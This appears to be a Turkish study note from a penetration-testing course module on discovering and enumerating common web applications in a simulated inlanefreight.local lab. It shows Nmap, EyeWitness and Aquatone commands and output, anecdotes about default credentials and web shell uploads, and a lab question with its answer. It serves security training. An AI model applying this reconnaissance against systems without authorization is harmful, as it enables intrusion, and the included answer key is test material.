---
{"dg-publish":true,"permalink":"/active-directory/attacking-common-applications/"}
---



Web tabanlı uygulamalar, sızma testi uzmanları olarak karşılaştığımız tüm ortamlarda olmasa da çoğunda yaygındır. Değerlendirmelerimiz sırasında Content Management Systems (CMS), custom web uygulamaları, developerlar ve sysadmins tarafından kullanılan intranet portalları, code repositories, network monitoring tools, ticketing systems, wikis, knowledge bases, issue trackers, servlet container applications ve daha fazlası gibi çok çeşitli web uygulamaları ile karşılaşırız. Aynı uygulamaları birçok farklı ortamda bulmak yaygındır. Bir uygulama bir ortamda savunmasız olmayabilirken, diğerinde yanlış yapılandırılmış veya yamalanmamış olabilir. Bir değerlendiricinin bu modülde kapsanan yaygın uygulamaları numaralandırma ve bunlara saldırma konusunda sağlam bir kavrayışa sahip olması gerekir. 


## Application Data

Bu modül, yaygın uygulamaları derinlemesine, az yaygın olanları ise kısaca ele alır. Değerlendirmelerde erişim veya veri sızdırmada kullanılabilecek uygulama kategorileri incelenir.

| **Category**                                         | **Applications**                                                       |
| ---------------------------------------------------- | ---------------------------------------------------------------------- |
| **Web Content Management**                           | Joomla, Drupal, WordPress, DotNetNuke, etc.                            |
| **Application Servers**                              | Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc. |
| **Security Information and Event Management (SIEM)** | Splunk, Trustwave, LogRhythm, etc.                                     |
| **Network Management**                               | PRTG Network Monitor, ManageEngine Opmanger, etc.                      |
| **IT Management**                                    | Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.            |
| **Software Frameworks**                              | JBoss, Axis2, etc.                                                     |
| **Customer Service Management**                      | osTicket, Zendesk, etc.                                                |
| **Search Engines**                                   | Elasticsearch, Apache Solr, etc.                                       |
| **Software Configuration Management**                | Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.     |
| **Software Development Tools**                       | Jenkins, Atlassian Confluence, phpMyAdmin, etc.                        |
| **Enterprise Application Integration**               | Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.        |



| **Uygulama**             | **Açıklama**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **WordPress**            | WordPress, birden fazla amaç için kullanılabilen açık kaynaklı bir **Content Management System (CMS)**'dir. Genellikle bloglar ve forumlar için kullanılır. Yüksek derecede özelleştirilebilir ve **SEO** dostu olduğu için şirketler arasında popülerdir. Ancak, üçüncü taraf temalar ve pluginler üzerinden gelebilecek güvenlik açıklarına yatkındır. **PHP** ile yazılmıştır ve genellikle **Apache** üzerinde çalışır; backend için **MySQL** kullanılır.                                                                         |
| **Drupal**               | Drupal, şirketler ve geliştiriciler arasında popüler olan başka bir açık kaynaklı **CMS**'dir. **PHP** ile yazılmıştır ve backend için **MySQL** veya **PostgreSQL** kullanır. **DBMS** kurulu değilse **SQLite** da kullanılabilir. WordPress gibi, Drupal da temalar ve modüller aracılığıyla özelleştirme sağlar.                                                                                                                                                                                                                   |
| **Joomla**               | Joomla, genellikle **MySQL** kullanan ancak **PostgreSQL** veya **SQLite** ile de çalışabilen açık kaynaklı bir **CMS**'dir. Bloglar, tartışma forumları, e-ticaret ve daha fazlası için kullanılabilir. Joomla, temalar ve eklentilerle büyük ölçüde özelleştirilebilir ve internette WordPress ve Shopify’dan sonra en çok kullanılan üçüncü **CMS** olarak tahmin edilmektedir.                                                                                                                                                     |
| **Tomcat**               | Apache Tomcat, **Java** ile yazılmış uygulamaları barındıran açık kaynaklı bir web sunucusudur. Başlangıçta **Java Servlets** ve **Java Server Pages (JSP)** çalıştırmak için tasarlanmıştır. Ancak, Java tabanlı framework'ler ve araçlar (ör. **Spring**, **Gradle**) ile popülerliği artmıştır.                                                                                                                                                                                                                                     |
| **Jenkins**              | Jenkins, yazılım projelerini sürekli olarak oluşturma ve test etme konusunda geliştiricilere yardımcı olan, **Java** ile yazılmış açık kaynaklı bir otomasyon sunucusudur. **Tomcat** gibi servlet container'larda çalışır. Yıllar içinde, kimlik doğrulama gerektirmeyen **remote code execution** dahil birçok güvenlik açığı bulunmuştur.                                                                                                                                                                                           |
| **Splunk**               | Splunk, verileri toplamak, analiz etmek ve görselleştirmek için kullanılan bir log analitik aracıdır. Başlangıçta bir **SIEM** aracı olarak tasarlanmamış olmasına rağmen, genellikle güvenlik izleme ve iş analitiği için kullanılır. Splunk genellikle hassas verileri barındırır ve ele geçirilirse saldırganlar için bilgi kaynağı olabilir. Bilinen büyük güvenlik açıkları azdır, ancak **CVE-2018-11409** (bilgi sızıntısı) ve **CVE-2011-4642** (kimlik doğrulamalı **remote code execution**) gibi bazı eski açıkları vardır. |
| **PRTG Network Monitor** | PRTG Network Monitor, aget gerektirmeyen bir ağ izleme sistemidir. Çeşitli cihazlardan (router, switch, sunucu vb.) çalışma süresi ve bant genişliği gibi metrikleri izlemek için kullanılır. Ağ taraması yapmak için otomatik keşif modunu kullanır ve **ICMP**, **WMI**, **SNMP**, **NetFlow** gibi protokollerle iletişim kurar. **Delphi** ile yazılmıştır.                                                                                                                                                                        |
| **osTicket**             | osTicket, yaygın olarak kullanılan açık kaynaklı bir support ticket sistemidir. E-posta, telefon ve web arayüzü üzerinden alınan müşteri hizmeti biletlerini yönetmek için kullanılır. **PHP** ile yazılmıştır ve **Apache** veya **IIS** üzerinde çalışabilir; backend için **MySQL** kullanır.                                                                                                                                                                                                                                       |
| **GitLab**               | GitLab, bir yazılım geliştirme platformudur ve **Git repository manager**, sürüm kontrolü, issue tracking, kod inceleme, sürekli entegrasyon ve dağıtım gibi birçok özellik sunar. Başlangıçta **Ruby** ile yazılmıştır ancak artık **Ruby on Rails**, **Go** ve **Vue.js** kullanmaktadır. GitLab, topluluk (ücretsiz) ve kurumsal sürümler sunar.                                                                                                                                                                                    |

Modül bölümleri boyunca http://app.inlanefreight.local gibi URL'lere atıfta bulunacağız. Birden fazla web sunucusunun bulunduğu büyük ve gerçekçi bir ortamı simüle etmek için web uygulamalarını barındıran Vhost'lardan yararlanıyoruz. Bu Vhost'ların hepsi aynı host üzerinde farklı bir dizine eşlendiğinden, laboratuvarla etkileşime geçmek için Pwnbox veya lokal saldırı VM'sindeki /etc/hosts dosyamıza manuel girişler yapmamız gerekiyor. Bunun, bir FQDN kullanarak taramaları veya ekran görüntülerini gösteren tüm örnekler için yapılması gerekir. Splunk gibi yalnızca oluşturulan hedefin IP adresini kullanan bölümler bir hosts dosyası girişi gerektirmez ve yalnızca oluşturulan IP adresi ve ilişkili port ile etkileşime girebilirsiniz.

Bunu hızlı bir şekilde yapmak için aşağıdakileri çalıştırabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ IP=10.129.42.195

M1R4CKCK@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```


Bu komuttan sonra, /etc/hosts dosyamız aşağıdaki gibi görünecektir (yeni oluşturulmuş bir Pwnbox üzerinde):

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/hosts

# Your system has configured 'manage_etc_hosts' as True.
# As a result, if you wish for changes to this file to persist
# then you will need to either
# a.) make changes to the master file in /etc/cloud/templates/hosts.debian.tmpl
# b.) change or remove the value of 'manage_etc_hosts' in
#     /etc/cloud/cloud.cfg or cloud-config from user-data
#
127.0.1.1 htb-9zftpkslke.htb-cloud.com htb-9zftpkslke
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

10.129.42.195	app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local
```

# Application Discovery & Enumeration

- Ağdaki tüm cihazları, yüklü yazılımları ve kullanılan uygulamaları içeren bir **asset envanteri** tutulmalı ve düzenli olarak güncellenmelidir.
- Kuruluş, ağında nelerin bulunduğunu bilmeden, neyi koruyacağını veya potansiyel açıkları tespit edemez.
- Uygulamaların lokal mi yoksa üçüncü tarafça mı barındırıldığını belirlemek önemlidir.
- Mevcut yama seviyeleri takip edilmeli, uygulamaların kullanım ömrü sonuna yaklaşıp yaklaşmadığı kontrol edilmelidir.
- Ağdaki kötü niyetli uygulamalar veya **shadow IT** tespit edilmelidir.
- Tüm uygulamaların varsayılan olmayan güçlü parolalarla korunması sağlanmalıdır.
- İdeal olarak, uygulamalarda **çok faktörlü kimlik doğrulama** etkinleştirilmelidir.
- Yönetim portalları, yalnızca belirli IP adreslerinden veya **localhost** gibi host üzerinden erişimle sınırlandırılabilir.

Sızma testi uzmanları, az bilgiyle bir ağın genel görünümünü çıkarmalıdır. Ping taramasıyla **live hosts** tespit edilir, ardından port ve servis taramaları yapılır. Büyük ağlarda bu veriler karmaşıklaşabilir; örneğin, yaygın web hizmetleri için **Nmap taraması** yapılabilir.

#### Nmap - Web Discovery

```shell-session
M1R4CKCK@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
```

Yalnızca 80 ve 443 numaralı portlarda çalışan hizmetlere sahip çok sayıda host bulabiliriz. Bu verilerle ne yapacağız? Büyük bir ortamda numaralandırma verilerini elle incelemek çok zaman alıcı olacaktır, özellikle de çoğu değerlendirme katı zaman kısıtlamaları altında olduğundan. Her bir IP/hostname + porta göz atmak da oldukça verimsiz olacaktır.

Her test uzmanının cephaneliğinde bulunması gereken iki olağanüstü araç ==EyeWitness== ve ==Aquatone=='dur. Bu araçların her ikisi de ham Nmap XML tarama çıktısı ile beslenebilir (Aquatone ayrıca Masscan XML alabilir; EyeWitness Nessus XML çıktısı alabilir) ve web uygulamaları çalıştıran tüm hostları hızlı bir şekilde incelemek ve her birinin ekran görüntülerini almak için kullanılabilir. Ekran görüntüleri daha sonra web saldırı yüzeyini değerlendirmek için web tarayıcısında üzerinde çalışabileceğimiz bir rapor haline getirilir.

Bu ekran görüntüleri, potansiyel olarak 100'lerce hostu daraltmamıza ve numaralandırmak ve saldırmak için daha fazla zaman harcamamız gereken daha hedefli bir uygulama listesi oluşturmamıza yardımcı olabilir. Bu araçlar hem Windows hem de Linux için mevcuttur, bu nedenle belirli bir ortamda saldırı kutumuz için hangisini seçersek onu kullanabiliriz. Hedef INLANEFREIGHT.LOCAL domaininde bulunan uygulamaların bir envanterini oluşturmak için her birinden bazı örnekler üzerinden gidelim.


### İlk Numaralandırma

Müşterimizin bize aşağıdaki scope sağladığını varsayalım:

```shell-session
M1R4CKCK@htb[/htb]$ cat scope_list 

app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog-dev.inlanefreight.local
blog.inlanefreight.local
app-dev.inlanefreight.local
jenkins-dev.inlanefreight.local
jenkins.inlanefreight.local
web01.inlanefreight.local
gitlab-dev.inlanefreight.local
gitlab.inlanefreight.local
support-dev.inlanefreight.local
support.inlanefreight.local
inlanefreight.local
10.129.201.50
```

- Yaygın web portlarını tespit etmek için **Nmap** taraması yapılır.
- İlk olarak genellikle **80, 443, 8000, 8080, 8180, 8888, 10000** portları taranır.
- Bu ilk tarama sonuçlarına karşı **EyeWitness** veya **Aquatone** gibi araçlar çalıştırılır.
- Ekran görüntüsü raporunu inceledikten sonra, kapsamın büyüklüğüne bağlı olarak **ilk 10.000 port** veya tüm **TCP portları** taranabilir.
- **Numaralandırma**, yinelemeli bir süreçtir; bu nedenle sonraki **Nmap** taramaları sonrası tekrar bir web ekran görüntüsü aracı çalıştırılır.

- Aşındırıcı olmayan tam kapsamlı testlerde, **Nessus** taraması yapılır, ancak sadece tarama araçlarına güvenilmemelidir.
- Değerlendirmeler zaman sınırlı ve genellikle uygun şekilde kapsamlandırılmamıştır.
- **Tekrarlanabilir ve kapsamlı bir numaralandırma metodolojisi** ile maksimum değer sağlanabilir.
- **Bilgi toplama** aşamasında verimli olunmalı, kritik kusurlar keşfedilmeden bırakılmamalıdır.
- Farklı metodolojiler ve araçlarla nihai hedefe ulaşmak için etkili bir yöntem oluşturulmalıdır.


```shell-session
M1R4CKCK@htb[/htb]$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:49 EDT
Stats: 0:00:07 elapsed; 1 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.24% done; ETC: 21:49 (0:00:01 remaining)

Nmap scan report for app.inlanefreight.local (10.129.42.195)
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.12s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
8009/tcp open  ajp13
8080/tcp open  http-proxy
8180/tcp open  unknown
8888/tcp open  sun-answerbook

Nmap scan report for gitlab-dev.inlanefreight.local (10.129.201.88)
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap scan report for 10.129.201.50
Host is up (0.13s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
8000/tcp open  http-alt
8080/tcp open  http-proxy
8089/tcp open  unknown

<SNIP>
```

Gördüğümüz gibi, çeşitli portlarda web sunucuları çalıştıran birkaç host tespit ettik. Sonuçlardan, hostlardan birinin Windows ve diğerlerinin Linux olduğu sonucunu çıkarabiliriz (ancak bu aşamada %100 emin olamayız). Host isimlerine de özellikle dikkat edin. Bu laboratuvarda, bir şirketin subdomainlerini simüle etmek için Vhosts kullanıyoruz. FQDN'nin bir parçası olarak dev içeren hostlar, test edilmemiş özellikleri çalıştırıyor olabilecekleri veya debug modu gibi şeyleri etkinleştirmiş olabilecekleri için not edilmeye değerdir. Bazen host adları bize çok fazla bilgi vermez, örneğin app.inlanefreight.local. Bunun bir uygulama sunucusu olduğu sonucuna varabiliriz, ancak üzerinde hangi uygulama(lar)ın çalıştığını belirlemek için daha fazla numaralandırma yapmamız gerekir.

Ayrıca gitlab-dev.inlanefreight.local adresini keşif aşamasını tamamladıktan sonra araştırmak üzere “ilginç hostlar” listemize eklemek isteriz. Kimlik bilgileri gibi hassas bilgiler içerebilecek herkese açık Git depolarına veya bizi diğer subdomain/Vhost'lara yönlendirebilecek ipuçlarına erişebiliriz. Hesabı etkinleştirmek için yönetici onayı gerekmeden bir kullanıcıyı kaydetmemize izin veren Gitlab örneklerini bulmak nadir değildir. Oturum açtıktan sonra ek repolar bulabiliriz

Varsayılan en iyi 1.000 porta karşı bir Nmap hizmet taraması (-sV) kullanarak hostlardan birini daha fazla numaralandırmak bize web sunucusunda neler çalıştığı hakkında daha fazla bilgi verebilir.

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap --open -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:58 EDT
Nmap scan report for 10.129.201.50
Host is up (0.13s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd (free license; remote login disabled)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds
```

Yukarıdaki çıktıdan, bir IIS web sunucusunun varsayılan 80 numaralı portta çalıştığını ve Splunk'ın 8000/8089 numaralı portta çalıştığını, PRTG Network Monitor'ün ise 8080 numaralı portta bulunduğunu görebiliriz. Orta ila büyük ölçekli bir ortamda olsaydık, bu tür bir numaralandırma verimsiz olurdu. Görevin başarısı için kritik olabilecek bir web uygulamasını kaçırmamıza neden olabilir.

## Using EyeWitness

İlk sırada EyeWitness var. Daha önce de belirtildiği gibi, EyeWitness hem Nmap hem de Nessus'tan XML çıktısını alabilir ve Selenium kullanarak çeşitli portlarda bulunan her web uygulamasının ekran görüntülerini içeren bir rapor oluşturabilir. Ayrıca işleri bir adım öteye taşıyacak ve mümkün olduğunda uygulamaları kategorize edecek, parmak izlerini alacak ve uygulamaya göre varsayılan kimlik bilgilerini önerecektir. Ayrıca IP adresleri ve URL'lerin bir listesi verilebilir ve her birinin önüne http:// ve https:// adreslerini önceden eklemesi söylenebilir. IP'ler için DNS çözümlemesi gerçekleştirecek ve bağlanmaya ve ekran görüntüsü almaya çalışması için belirli bir port kümesi verilebilir.

```shell-session
M1R4CKCK@htb[/htb]$ sudo apt install eyewitness
```

veya [depoyu](https://github.com/FortyNorthSecurity/EyeWitness) klonlayın, Python/setup dizinine gidin ve setup.sh yükleyici scriptini çalıştırın. EyeWitness bir Docker konteynerinden de çalıştırılabilir ve Visual Studio kullanılarak derlenebilen bir Windows sürümü de mevcuttur.

eyewitness -h komutunu çalıştırmak bize mevcut seçenekleri gösterecektir:

```shell-session
M1R4CKCK@htb[/htb]$ eyewitness -h

usage: EyeWitness.py [--web] [-f Filename] [-x Filename.xml]
                     [--single Single URL] [--no-dns] [--timeout Timeout]
                     [--jitter # of Seconds] [--delay # of Seconds]
                     [--threads # of Threads]
                     [--max-retries Max retries on a timeout]
                     [-d Directory Name] [--results Hosts Per Page]
                     [--no-prompt] [--user-agent User Agent]
                     [--difference Difference Threshold]
                     [--proxy-ip 127.0.0.1] [--proxy-port 8080]
                     [--proxy-type socks5] [--show-selenium] [--resolve]
                     [--add-http-ports ADD_HTTP_PORTS]
                     [--add-https-ports ADD_HTTPS_PORTS]
                     [--only-ports ONLY_PORTS] [--prepend-https]
                     [--selenium-log-path SELENIUM_LOG_PATH] [--resume ew.db]
                     [--ocr]

EyeWitness is a tool used to capture screenshots from a list of URLs

Protocols:
  --web                 HTTP Screenshot using Selenium

Input Options:
  -f Filename           Line-separated file containing URLs to capture
  -x Filename.xml       Nmap XML or .Nessus file
  --single Single URL   Single URL/Host to capture
  --no-dns              Skip DNS resolution when connecting to websites

Timing Options:
  --timeout Timeout     Maximum number of seconds to wait while requesting a
                        web page (Default: 7)
  --jitter # of Seconds
                        Randomize URLs and add a random delay between requests
  --delay # of Seconds  Delay between the opening of the navigator and taking
                        the screenshot
  --threads # of Threads
                        Number of threads to use while using file based input
  --max-retries Max retries on a timeout
                        Max retries on timeouts

<SNIP>
```

Keşif taramasından elde edilen Nmap XML çıktısını girdi olarak kullanarak ekran görüntüsü almak için varsayılan --web seçeneğini çalıştıralım.

```shell-session
M1R4CKCK@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (26 Hosts)
Attempting to screenshot http://app.inlanefreight.local
Attempting to screenshot http://app-dev.inlanefreight.local
Attempting to screenshot http://app-dev.inlanefreight.local:8000
Attempting to screenshot http://app-dev.inlanefreight.local:8080
Attempting to screenshot http://gitlab-dev.inlanefreight.local
Attempting to screenshot http://10.129.201.50
Attempting to screenshot http://10.129.201.50:8000
Attempting to screenshot http://10.129.201.50:8080
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://jenkins-dev.inlanefreight.local
Attempting to screenshot http://jenkins-dev.inlanefreight.local:8000
Attempting to screenshot http://jenkins-dev.inlanefreight.local:8080
Attempting to screenshot http://support-dev.inlanefreight.local
Attempting to screenshot http://drupal-dev.inlanefreight.local
[*] Hit timeout limit when connecting to http://10.129.201.50:8000, retrying
Attempting to screenshot http://jenkins.inlanefreight.local
Attempting to screenshot http://jenkins.inlanefreight.local:8000
Attempting to screenshot http://jenkins.inlanefreight.local:8080
Attempting to screenshot http://support.inlanefreight.local
[*] Completed 15 out of 26 services
Attempting to screenshot http://drupal-qa.inlanefreight.local
Attempting to screenshot http://web01.inlanefreight.local
Attempting to screenshot http://web01.inlanefreight.local:8000
Attempting to screenshot http://web01.inlanefreight.local:8080
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://drupal-acc.inlanefreight.local
Attempting to screenshot http://drupal.inlanefreight.local
Attempting to screenshot http://blog-dev.inlanefreight.local
Finished in 57.859838008880615 seconds

[*] Done! Report written in the /home/mrb3n/Projects/inlanfreight/inlanefreight_eyewitness folder!
Would you like to open the report now? [Y/n]
```

## Using Aquatone

[Aquatone](https://github.com/michenriksen/aquatone), daha önce de belirtildiği gibi, EyeWitness'a benzer ve hostların bir .txt dosyası veya -nmap bayrağı ile bir Nmap .xml dosyası sağlandığında ekran görüntüleri alabilir. Aquatone'u kendimiz derleyebilir veya önceden derlenmiş bir binary indirebiliriz. Binary'yi indirdikten sonra, sadece extract etmemiz gerekiyor ve gitmeye hazırız.

Not: Aquatone şu anda iyileştirmelere ve özellik geliştirmelerine odaklanan yeni bir forkta aktif olarak geliştirilmektedir. [Depoda](https://github.com/shelld3v/aquatone) sağlanan kurulum kılavuzuna bakın.

```shell-session
M1R4CKCK@htb[/htb]$ wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```

```shell-session
M1R4CKCK@htb[/htb]$ unzip aquatone_linux_amd64_1.7.0.zip 

Archive:  aquatone_linux_amd64_1.7.0.zip
  inflating: aquatone                
  inflating: README.md               
  inflating: LICENSE.txt 
```

Aracı her yerden çağırabilmek için $PATH'imizde /usr/local/bin gibi bir konuma taşıyabilir veya binary'yi çalışma (örneğin, taramalar) dizinimize bırakabiliriz. Bu kişisel bir tercihtir ancak genellikle saldırı VM'lerimizi sürekli dizin değiştirmek veya başka dizinlerden çağırmak zorunda kalmadan kullanılabilecek çoğu araçla oluşturmak en verimli yöntemdir.

```shell-session
M1R4CKCK@htb[/htb]$ echo $PATH

/home/mrb3n/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Bu örnekte, araca -nmap flag'ini belirterek aynı web_discovery.xml Nmap çıktısını sağlıyoruz ve çalışmaya başlıyoruz

```shell-session
M1R4CKCK@htb[/htb]$ cat web_discovery.xml | ./aquatone -nmap

aquatone v1.7.0 started at 2021-09-07T22:31:03-04:00

Targets    : 65
Threads    : 6
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://web01.inlanefreight.local:8000/: 403 Forbidden
http://app.inlanefreight.local/: 200 OK
http://jenkins.inlanefreight.local/: 403 Forbidden
http://app-dev.inlanefreight.local/: 200 
http://app-dev.inlanefreight.local/: 200 
http://app-dev.inlanefreight.local:8000/: 403 Forbidden
http://jenkins.inlanefreight.local:8000/: 403 Forbidden
http://web01.inlanefreight.local:8080/: 200 
http://app-dev.inlanefreight.local:8000/: 403 Forbidden
http://10.129.201.50:8000/: 200 OK

<SNIP>

http://web01.inlanefreight.local:8000/: screenshot successful
http://app.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local/: screenshot successful
http://jenkins.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local/: screenshot successful
http://app-dev.inlanefreight.local:8000/: screenshot successful
http://jenkins.inlanefreight.local:8000/: screenshot successful
http://app-dev.inlanefreight.local:8000/: screenshot successful
http://app-dev.inlanefreight.local:8080/: screenshot successful
http://app.inlanefreight.local/: screenshot successful

<SNIP>

Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2021-09-07T22:31:03-04:00
 - Finished at : 2021-09-07T22:31:36-04:00
 - Duration    : 33s

Requests:
 - Successful : 65
 - Failed     : 0

 - 2xx : 47
 - 3xx : 0
 - 4xx : 18
 - 5xx : 0

Screenshots:
 - Successful : 65
 - Failed     : 0

Wrote HTML report to: aquatone_report.html
```


### Sonuçların Yorumlanması

Yukarıdaki 26 host ile bile bu rapor bize zaman kazandıracaktır. Şimdi 500 ya da 5.000 hostun bulunduğu bir ortam hayal edin! Raporu açtıktan sonra, raporun kategoriler halinde düzenlendiğini, Yüksek Değerli Hedeflerin ilk sırada yer aldığını ve genellikle peşinden gidilecek en “cazip” hostlar olduğunu görüyoruz. EyeWitness'ı çok büyük ortamlarda çalıştırdım ve incelemesi saatler süren yüzlerce sayfalık raporlar oluşturdum. Çoğu zaman, çok büyük raporların içinde derinlere gömülü ilginç hostlar olacaktır, bu nedenle tümünü gözden geçirmeye ve bilmediğimiz herhangi bir uygulamayı kurcalamaya/araştırmaya değer. Giriş bölümünde bahsedilen ManageEngine OpManager uygulamasını harici bir sızma testi sırasında çok büyük bir raporun derinliklerine gömülmüş olarak buldum. Bu örnek varsayılan admin:admin kimlik bilgileriyle yapılandırılmış ve internete tamamen açık bırakılmıştı. Bir PowerShell script'i çalıştırarak oturum açabildim ve kod yürütmeyi başardım. OpManager uygulaması bir Domain Admin hesabı bağlamında çalışıyordu ve bu da dahili ağın tamamen ele geçirilmesine yol açtı.

Aşağıdaki raporda, Tomcat'i herhangi bir değerlendirmede (ancak özellikle bir External Penetration Test sırasında) gördüğümde hemen heyecanlanırdım ve /manager ve /host-manager endpoint'lerinde varsayılan kimlik bilgilerini denerdim. Her ikisine de erişebilirsek, kötü amaçlı bir WAR dosyası yükleyebilir ve JSP kodunu kullanarak altta yatan hostta remote code execution elde edebiliriz. Bu konuda modülün ilerleyen bölümlerinde daha fazla bilgi verilecektir.

![Pasted image 20241228032642.png](/img/user/resimler/Pasted%20image%2020241228032642.png)

Rapora devam edecek olursak, sırada http://inlanefreight.local ana web sitesi var gibi görünüyor. Özel web uygulamaları çok çeşitli güvenlik açıkları içerebileceğinden her zaman test edilmeye değerdir. Burada web sitesinin WordPress, Joomla veya Drupal gibi popüler bir CMS çalıştırıp çalıştırmadığını da görmek isterim. Bir sonraki uygulama olan http://support-dev.inlanefreight.local ilginçtir çünkü yıllar boyunca çeşitli ciddi güvenlik açıklarından muzdarip olan osTicket'i çalıştırıyor gibi görünmektedir. Support bilet sistemleri özellikle ilgi çekicidir çünkü oturum açabilir ve hassas bilgilere erişim sağlayabiliriz. Sosyal mühendislik kapsam dahilindeyse, müşteri destek personeliyle etkileşime girebilir veya hatta sistemi manipüle ederek şirketin domain'i için geçerli bir e-posta adresi kaydedebilir ve böylece diğer hizmetlere erişim elde edebiliriz.

Son parça, HTB haftalık sürüm kutusu olan **Delivery**'de IppSec tarafından gösterildi. Bu özel kutu, belirli yaygın uygulamaların yerleşik işlevselliğini keşfederek nelerin mümkün olduğunu gösterdiği için incelenmeye değerdir. **osTicket**'i bu modülde daha ayrıntılı bir şekilde ele alacağız.

![Pasted image 20241228033249.png](/img/user/resimler/Pasted%20image%2020241228033249.png)

https://0xdf.gitlab.io/2021/05/22/htb-delivery.html

Bir değerlendirme sırasında, raporu inceleyip ilginç hostları not ederim (URL, uygulama adı/sürümü dahil). Bilgi toplama aşamasında her detay önemlidir ve dikkatsizce hostlara saldırmak, önemli şeyleri gözden kaçırmamıza yol açabilir. External Penetration Test sırasında, özel uygulamalar, CMS, Tomcat, Jenkins, Splunk, RDS, SSL VPN, OWA, O365 ve edge ağ cihazları gibi farklı sistemler görmeyi beklerim.

Aldığınız mesafe değişebilir ve bazen kesinlikle maruz kalmaması gereken uygulamalarla karşılaşabiliriz, örneğin bir keresinde karşılaştığım dosya yükleme butonu olan tek bir sayfada “Lütfen yalnızca .zip ve .tar.gz dosyalarını yükleyin” şeklinde bir mesaj vardı. Elbette bu uyarıyı dikkate almadım (çünkü bu, müşteri onaylı bir sızma testi kapsamındaydı) ve bir test .aspx dosyası yüklemeye devam ettim. Şaşırtıcı bir şekilde, client-side ya da back-end doğrulaması yoktu ve dosya yüklenmiş gibi görünüyordu. Hızlı bir dizin zorlaması yaparak, dizin listelemenin etkin olduğu bir /files dizini bulabildim ve test.aspx dosyam oradaydı. Buradan, bir .aspx web shell yüklemeye devam ettim ve dahili ortamda bir yer edindim. Bu örnek, taş üstünde taş bırakmamamız gerektiğini ve uygulama keşif verilerimizde bizim için mutlak bir veri hazinesi olabileceğini göstermektedir.

Bir external Penetrasyon Testi sırasında, aynı şeylerin çoğunu göreceğiz, ancak genellikle birçok yazıcı giriş sayfasını (bazen açık metin LDAP kimlik bilgilerini elde etmek için kullanabileceğimiz), ESXi ve vCenter giriş portallarını, iLO ve iDRAC giriş sayfalarını, çok sayıda ağ cihazını, IoT cihazlarını, IP telefonlarını, dahili kod depolarını, SharePoint ve özel intranet portallarını, güvenlik cihazlarını ve çok daha fazlasını da göreceğiz.


Soru : EyeWitness ile bir rapor oluşturmak için bu bölümde öğrendiklerinizi kullanın. EyeWitness'ın inlanefreight_eyewitness klasöründe oluşturduğu .db dosyasının adı nedir? (Format: filename.db)

Cevap : ew.db

![Pasted image 20241228041038.png](/img/user/resimler/Pasted%20image%2020241228041038.png)

